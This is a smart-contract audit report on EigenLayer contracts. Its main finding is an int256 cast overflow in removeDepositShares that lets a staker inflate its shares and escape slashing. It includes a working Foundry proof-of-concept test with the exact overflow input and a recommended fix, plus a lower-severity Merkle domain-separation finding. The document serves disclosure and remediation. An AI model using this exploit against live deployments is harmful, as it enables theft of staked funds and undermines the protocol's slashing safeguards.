HIGH
=============================================
# 🔴[H-01] Staker is able to avoid slashing penalties by inflating `PodOwnerDepositShares` and `OperatorShares` through an overflow

## Summary
A Staker is able to inflate the value of `PodOwnerDepositShares` and `OperatorShares` by exploiting an overflow issue in the `removeDepositShares` function, where an unrestricted `depositSharesToRemove` value is casted from `uint256` to `int256`.  
Thanks to this inflation, the Staker will be able to withdraw his full EigenPod balance even if a slashing event happens, as his shares will not be reflective to its actual balance.  
## Finding Description

The exploit is divided in 3 main parts:
1. Staker inflating `PodOwnerDepositShares`
2. Staker delegating to Operator
3. Staker withdraw its full eigenPod after a slashing event

### 1) Inflating PodOwnerDepositShares
The root cause of the issue is presented in the following snippet `L153`, where `depositSharesToRemove`, which is a `uint256` value, can overflow because of an unsafe casting into a `int256`:

```solidity
File: src/contracts/pods/EigenPodManager.sol
147:     function removeDepositShares(
148:         address staker,
149:         IStrategy strategy,
150:         uint256 depositSharesToRemove
151:     ) external onlyDelegationManager nonReentrant returns (uint256) {
152:         require(strategy == beaconChainETHStrategy, InvalidStrategy());
			 // ❌ the issue is located on the line below, the int256 cast can be forced to overflow
			 // causing the updatedShares to reach huge values
153:         int256 updatedShares = podOwnerDepositShares[staker] - int256(depositSharesToRemove);
154:         require(updatedShares >= 0, SharesNegative());
155:         podOwnerDepositShares[staker] = updatedShares;
156: 
157:         emit NewTotalShares(staker, updatedShares);
158:         return uint256(updatedShares);
159:     }
```

The `depositSharesToRemove` variable is provided by the Staker as part of the [`QueuedWithdrawalParams` struct](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/interfaces/IDelegationManager.sol#L125-L129), through the [`DelegationManager::queueWithdrawals`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L180-L180) external function.   
By inputing an huge value, e.g `uint256(2**256 - 1_000_000 ether)`, the overflowing cast into `int256` will lead to a value of `- 1_000_000 ether`, which negated become `+ 1_000_000 ether`, making `updatedShares = 'previousDepositShares' + 1_000_000 ether`

The full path to the overflow is the following:
1. [`DelegationManager::queueWithdrawals`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L195) with `QueuedWithdrawalParams{strategies: [BeaconChainETHStrategy], depositShares: [2**256 - 1_000_000 ether]}` provided
2. [`DelegationManager::_removeSharesAndQueueWithdrawal`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L502)
3. [`EigenPodManager::removeDepositShares`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/pods/EigenPodManager.sol#L153-L153)

**The first condition here, is that the Staker must create its deposit, and *its malicious withdrawal* without being delegated to any Operator first,** which will allow him to avoid the [`if(operator != address(0)` condition](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L486-L499) in `_removeSharesAndQueueWithdrawal` , as  `_decreaseDelegation` [would underflow](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L681-L681) by trying to substract that huge value to the `operatorShares`.  
As the Staker isn't delegate to an operator yet, this does not happen, and the function effectively continue into [`EigenPodManager::removeDepositShares`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/pods/EigenPodManager.sol#L153-L153) where it will ultimately overflow and inflate the `PodOwnerDepositShares`.  

The withdrawal shouldn't be and cannot be completed once in this state anyway (only queued, for now). The reason is that in the process of completing the withdrawal, the [`DelegationManager::withdrawSharesAsTokens`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L599-L599) is called and would revert [here](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/pods/EigenPodManager.sol#L191-L191), as the overflowing value casted to `int256` would be negative. But that is not an issue as this is only the first part of the exploit.  
### 2) Delegating to Operator
Now that the Staker has inflated its `PodOwnerDepositShares`, he can participate and delegate to an Operator in order to earn rewards from the AVS. This happens by calling [`DelegationManager::delegateTo`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L145-L145) which calls the internal function [`_delegate`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L350-L350) (snippet below):
```solidity
File: src/contracts/core/DelegationManager.sol
350:     function _delegate(address staker, address operator) internal onlyWhenNotPaused(PAUSED_NEW_DELEGATION) {
351:         // When a staker is not delegated to an operator, their deposit shares are equal to their
352:         // withdrawable shares -- except for the beaconChainETH strategy, which is handled below
353:         (IStrategy[] memory strategies, uint256[] memory withdrawableShares) = getDepositedShares(staker);
...:
...:  // ---------- some code ---------- //
...:
373: 
374:             // forgefmt: disable-next-item
375:             _increaseDelegation({
376:                 operator: operator, 
377:                 staker: staker, 
378:                 strategy: strategies[i],
379:                 prevDepositShares: uint256(0),
380:                 addedShares: withdrawableShares[i],
381:                 slashingFactor: operatorSlashingFactors[i]
382:             });
383:         }
384:     }
```

The function calls `getDepositedShares` which returns the Staker `PodOwnerDepositShares` (when the strategy is the beaconChain strategy).  
Remember that **the value is inflated**, which will then be forwarded to `_increaseDelegation` , [increasing the `operatorShares` for that strategy](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L662-L662), **making that core state variable incorrect in regard to the reality of the existing assets at stake.**  
I haven't assessed the full impact of that specific issue, but this will  at least break how reward accounting is done as Sidecar relies on that specific value for "Operator Directed" rewards.  
*We could imagine an Operator implementing this exploit for that specific reason, inflating his shares in a subtle way to not ring the bell, but still earn more reward than he should.*

Going back to the Staker, he is now sitting into the protocol, earning rewards related to the Operator actions into AVSs.  
### 3) Withdrawing assets after slashing

As things go on and the Operator participate into the AVS security, a slash happens because of a malicious behavior, or honest mistake.  
The AVS calls [`AllocationManager::slashOperator`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/AllocationManager.sol#L64-L64), slashing a wad amount (let's say 0.5e18 = 50% for simplicity): the function then [reduce the Operator magnitudes](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/AllocationManager.sol#L109-L111) and [slashes its `OperatorShares`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/AllocationManager.sol#L140-L140), dividing them by 2. But as the Operator shares are inflated anyway, the operator still has more shares than he should be entitled.  

**From there, in normal conditions** (and supposing the Staker's Validator hasn't been slashed) the Staker should only be able to withdraw half of its assets from the EigenPod. This is where the step (1) play its role, as the Staker was able to inflate its shares by `1_000_000` Ether.  

The final step of the exploit, which goal is to avoid effect of slashing can be executed, and is pretty simple: the Staker only need to create a new withdrawal request through [`DelegationManager::queueWithdrawals`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L195), forgetting its previous buggy one, as nothing prevent multiple withdrawals to be queued in parallel.   

Because the `slashingFactor` is now impacted by the slashing of the Operator's magnitude that has been reduced by 50%, we expect that the Staker should be able to only complete the withdrawal of half of its EigenPod deposits (for simplicity, let's say users has 32 ETH in its EigenPod, so only 16 ETH).  
We can see this by checking the withdrawal completion process in `DelegationManager::_completeQueuedWithdrawal`, where [the amount he requested to withdraw is factored with the `slashingFactor` of the operator](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L579-L588)).

**The important trick here, is that the Staker will in fact request a withdrawal of `64 ETH`** of `depositShares`, so doubling the expected value:
- Everything works perfectly during the queuing as the Staker has enough shares (inflated) for that amount to be substracted without an underflow happening. 
- Then, once the `MIN_WITHDRAWAL_DELAY_BLOCKS` is passed, the Staker can call `DelegationManager::completeQueuedWithdrawals` with the new withdrawal he created, and the flag [`receiveAsTokens`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/DelegationManager.sol#L595-L595) set to `True`, which will call `EigenPodManager::withdrawSharesAsTokens`, and ultimately transfer the ETH to the staker through [`EigenPod::withdrawRestakedBeaconChainETH`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/pods/EigenPodManager.sol#L224-L224). 
- The Staker was able to withdraw its full deposited 32 ETH, even though it should have been limited to 16 ETH because of the 50% slashing.

## Impact Explanation
 1. A Staker can avoid slashing penalties, thus breaking a core security mechanism of Eigen Layer and AVSs.
	- The Staker cannot be force-undelegated by the Operator, as undelegating require to queue all the (inflated) shares for withdrawal, which would revert. 
	- The malicious actor could be an Operator  (with another address) with its own stake deposited to secure the AVS, acting maliciously to disturb the AVS while ensuring the slashing do not impact its assets.
	- The amount of slashing that could be avoided can be estimated:
		- First, we know that an EigenPod can have an arbitrary high number of validators linked to it
		- We also know that after the Pectra upgrade, it will be easy to reach really high value with a low validator count [as the max effective balance will be raised to 2048 ETH](https://ethereum.org/en/roadmap/pectra/#7251), making it even easier to stake a lot of assets in one EigenPod
		- Nothing prevent an actor to have multiple EigenPods and deploy the exploit on many of them
		- The amount at stake can reach a very high amounts, especially if a state actor is involved. 
		  While it is difficult to set numbers on this, we could easily imagine X% of the TVL used maliciously, which could avoid Y% of slashing. Depending on these numbers, this could means escaping with Z% of the TVL that should have been burnt.

2. The `OperatorShares` state variable for the `BeaconChainETHStrategy` can be inflated too, which will impact rewards calculations in the Sidecar, causing much trouble with the accounting for repartition of "Operator Directed" rewards.
	- A malicious Operator could inflate its `operatorShares` in a subtle way to earn more rewards from the AVS without being noticed.
## Likelihood Explanation
All the steps are easy to pull off up to the `DelegationManager::completeQueuedWithdrawals` call, which is subject to the admin-controlled `PAUSED_EXIT_WITHDRAWAL_QUEUE`.  
But activating this pause would force the entire protocol to stop the withdrawal completion process, and there are no way to stop a specific withdrawal, so it is unlikely this would be activated.  
This wouldn't prevent the withdrawal anyway, only pause it until a solution is found, but the AVS and the associated chain would be highly impacted.

## Proof of Concept 
To run the PoC, place this snippet into `src/test/integration/tests/Deposit_Queue_Complete.t.sol`:
```solidity

	function logOperatorShares(User operator, IStrategy[] memory strategies) public view {
        uint[] memory operatorShares  = delegationManager.getOperatorShares(address(operator), strategies);
        console.log("\xF0\x9F\x8E\xAF operatorShares: %e", operatorShares[0]);
    }
    
    function testAudit_Avoid_Slashing() public rand(0) noTracing{

        //// 0️⃣ Setting up actors and contracts
        (User operator,,) = _newRandomOperator();
        (AVS avs,) = _newRandomAVS();

        // only one strategy which is the beaconChain ETH Strategy
        IStrategy[] memory strategies = new IStrategy[](1);
        strategies[0] = beaconChainETHStrategy; 

        // creating the associated operatorSet where Operator will allocate full magnitude
        OperatorSet memory operatorSet = avs.createOperatorSet(strategies);
        operator.registerForOperatorSet(operatorSet);
        AllocateParams memory allocateParams = _genAllocation_AllAvailable(operator, operatorSet);
        operator.modifyAllocations(allocateParams);
        // ensuring allocationDelay is passed to make Operator slashable
        _rollForward_AllocationDelay(operator);

        // Create a staker with a 32 ETH balance and a deposit in the beaconChain ETH Strategy
        (User staker, uint[] memory tokenBalances) = _newStaker(strategies);
        // overriding the random balance from _newStaker
        console.log("\n\n----- (0) INITIAL STATE  --------------------");
        console.log("---------------------------------------------");
        uint stakerETHBalance = 32 ether;
        tokenBalances[0] = stakerETHBalance;
        cheats.deal(address(staker), stakerETHBalance);
        console.log("\xF0\x9F\x8E\xAF Staker ETH balance at start: %e", address(staker).balance);

        //// 1️⃣ Staker deposit into strategy
        console.log("\n\n----- (1) DEPOSIT INTO EIGEN LAYER ----------");
        console.log("---------------------------------------------");
        uint256 stakerShares;
        staker.depositIntoEigenlayer(strategies, tokenBalances);
        stakerShares = uint(eigenPodManager.podOwnerDepositShares(address(staker)));
        assertEq(32 ether, stakerShares);
        console.log("\xF0\x9F\x8E\xAF Staker depositShares: %e", stakerShares);

        // Ensure staker is not delegated to anyone post deposit
        assertFalse(delegationManager.isDelegated(address(staker)), "Staker should not be delegated after deposit");

        //// 2️⃣ Staker Queue Withdrawal with an amount that will overflow when casted into int256
        //// this will inflate the podOwnerDepositShares by 1_000_000 ETH
        console.log("\n\n----- (2) FIRST QUEUE WITHDRAWAL ------------");
        console.log("---------------------------------------------");
        Withdrawal[] memory withdrawals;
        uint[] memory shares = new uint[](1);
        uint256 sharesToWithdraw;
        sharesToWithdraw = (2**256) - 1_000_000 ether;
        shares[0] = sharesToWithdraw;
        withdrawals = staker.queueWithdrawals(strategies, shares);

        stakerShares = uint(eigenPodManager.podOwnerDepositShares(address(staker)));
        assertEq(32 ether + 1_000_000 ether, stakerShares);
        console.log("\xF0\x9F\x8E\xAF Staker depositShares: %e", stakerShares);

        //// 3️⃣ Staker delegates to opertor which will now inflate OperatorShares by the same amount
        console.log("\n\n----- (3) STAKER DELEGATE TO OPERATOR -------");
        console.log("---------------------------------------------");
        staker.delegateTo(operator);
        logOperatorShares(operator, strategies);

        // its not possible to force-undelegate the staker as this would revert because of the inflated shares to queue withdraw
        // operator.forceUndelegate(staker);

        //// 4️⃣ Slash Operator in OperatorSet
        console.log("\n\n----- (4) OPERATOR GET SLASHED --------------");
        console.log("---------------------------------------------");        
        uint wadToSlash = 0.5 * 1e18; // 50%
        SlashingParams memory slashParams = _genSlashing_Custom(operator, operatorSet, wadToSlash);
        avs.slashOperator(slashParams);
        logOperatorShares(operator, strategies);

        //// 5️⃣ Queue Withdrawal, because we have been slashed by 50%, but have an inflated number of shares
        //// we can request to withdraw "64 ETH" even though we only have 32 ETH in the pod, because 64*50% = 32
        console.log("\n\n----- (5) STAKER SECOND QUEUE WITHDRAWAL -----");
        console.log("----------------------------------------------");   
        sharesToWithdraw = 64 ether;
        shares[0] = sharesToWithdraw;
        withdrawals = staker.queueWithdrawals(strategies, shares);
        stakerShares = uint(eigenPodManager.podOwnerDepositShares(address(staker)));
        console.log("\xF0\x9F\x8E\xAF Staker depositShares: %e", stakerShares);
        console.log("\xF0\x9F\x8E\xAF Staker ETH balance: %e", address(staker).balance);
        
        //// 6️⃣ Complete Queued Withdrawal, the Staker is able to withdraw its full deposit (32 ETH)
        //// while the operator was slashed, thanks to 
        console.log("\n\n----- (6) STAKER WITHDRAW ASSETS -------------");
        console.log("----------------------------------------------");           
        _rollBlocksForCompleteWithdrawals(withdrawals);
        shares[0] = stakerShares;
        for (uint i = 0; i < withdrawals.length; i++) {
            staker.completeWithdrawalAsTokens(withdrawals[i]);
        }
        console.log("\xF0\x9F\x8E\xAF Staker depositShares: %e", stakerShares);
        console.log("\xF0\x9F\x8E\xAF Staker ETH balance: %e", address(staker).balance);

    }
```

## Recommendation
Preventing the casting overflow would prevent the issue:
```diff
    function removeDepositShares(
        address staker,
        IStrategy strategy,
        uint256 depositSharesToRemove
    ) external onlyDelegationManager nonReentrant returns (uint256) {
        require(strategy == beaconChainETHStrategy, InvalidStrategy());
+       require(depositSharesToRemove <= uint256(type(int256).max), "uint256 to int256 overflow");
        int256 updatedShares = podOwnerDepositShares[staker] - int256(depositSharesToRemove);
        require(updatedShares >= 0, SharesNegative());
        podOwnerDepositShares[staker] = updatedShares;

        emit NewTotalShares(staker, updatedShares);
        return uint256(updatedShares);
    }
```

MED
=============================================


LOW
=============================================

# 🔵[L-01] `RewardCoordinator` Merkle Tree implementation is missing leaves-nodes domain separator and tree depth check

## Summary  
The Merkle tree implementation in the [`RewardsCoordinator`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/RewardsCoordinator.sol#L507-L507) contract and [`Merkle`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/libraries/Merkle.sol#L51-L51) library lacks proper domain separation between internal nodes and leaf nodes, and fails to enforce a maximum tree depth, which could allow attackers to forge valid proofs through second preimage attacks.  
While the practicality of such attack is still very low as of today because of the use of keccak256 as a hashing function, it is preferred to implement it to be future proof.  
  
## Finding Description  
The `RewardsCoordinator` contract [uses a Merkle tree structure](https://github.com/Layr-Labs/eigenlayer-contracts/blob/dev/docs/core/RewardsCoordinator.md#rewards-merkle-tree-structure) to verify rewards claims. However, the implementation misses two important security measures related to Merkle trees:  
1. leaf-nodes domain separation: while the contract does use a salt for earner leaves and token leaves, the internal nodes of the tree do not have any domain separation from potential leaf values.  
2. tree depth validation: while the [`_verifyEarnerClaimProof`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/RewardsCoordinator.sol#L579-L579) and [`_verifyTokenClaimProof`](https://github.com/Layr-Labs/eigenlayer-contracts/blob/2e6fb35517775f4dff8df4d287cefa3bca17a4d9/src/contracts/core/RewardsCoordinator.sol#L547-L547) function does enforce that the leaf index fall into the maximum possible index depending for a proof array length, there is no verification for the maximum depth for the Merkle tree.  
  
Both of these issue together would allow an attacker to extend or shrink the tree in order to add leaves that would match a hash of an existing node of the tree during the verification.  
In the current implementation, when verifying Merkle proofs, the code concatenates two 32-byte values and hashes them with `keccak256`. An attacker could potentially craft specific leaf values that, when hashed, would match an internal node of the tree, allowing them to forge a valid proof.  
  
While this is not practical as of today, this is still common practice to ensure a futureproof implementation.  
  
## Impact Explanation  
The impact is rated as High because:  
- This vulnerability could allow an attacker to forge valid Merkle proofs for rewards they are not entitled to, potentially draining funds from the `RewardsCoordinator` contract. The attacker could claim rewards meant for other users or claim the same rewards multiple times.  
- Reward distributions can represent very a high amount, as we've seen some airdrops of new chains representing TVL >$100M at launch  
  
## Likelihood Explanation  
The likelihood is rated as Low because:  
- It requires careful crafting of specific values to exploit  
- The attacker needs to generate collision values, which is highly difficult but not impossible  
- But the complexity of the attack decrease with the size of the Merkle tree (more nodes = more chances to find a collision), even though the size of the tree must be very high for this to be noticeable  
  
## Proof of Concept  
A typical exploitation path would involve:  
1. Taking the Merkle tree structure used by the rewards system  
2. Finding a pair of values where `H(a||b) = c`, where `c` could be interpreted both as an internal node and as a leaf node  
3. Constructing a proof that uses this collision to claim rewards not meant for the attacker  
  
## Recommendation  
Implement leaves-nodes domain separator and tree depth check to prevent second pre-image attack.  
For domain separation, simply use add a `LEAF_HASH` and `NODE_HASH` when during the hashing process.  
For depth, this could be done by allowing Reward Updaters to indicate the tree depth alongside the `distributionRoot`